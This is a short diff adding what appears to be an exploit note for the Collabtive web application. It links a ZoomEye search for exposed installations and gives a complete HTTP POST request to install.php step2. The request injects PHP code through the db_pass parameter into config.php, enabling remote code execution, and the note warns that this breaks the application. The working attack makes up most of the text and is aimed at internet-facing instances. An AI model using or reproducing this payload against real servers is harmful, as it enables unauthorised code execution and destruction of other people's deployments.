@@ -1,0 +1,30 @@
+https://github.com/philippK-de/Collabtive
+
+https://www.zoomeye.org/searchResult?q=title%3Acollabtive
+
+on many instances you can reach install.php?step2 (https://github.com/philippK-de/Collabtive/blob/master/install.php)
+
+You can now pollute multiple parameters in order to write PHP Code in config.php reachable at /config/standard/config.php
+
+like this
+
+POST /install.php?action=step2&locale=en HTTP/2
+Host: xx
+Cookie: PHPSESSID=xx
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-GB,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 89
+Referer: https://xx/install.php?step2=1
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Te: trailers
+
+db_driver=mysql&db_host=localhost&db_name=a&db_user=b&db_pass=c%27%3B[PHPCODE]
+
+Note : IT WILL KILL THE APP... so.. hey..
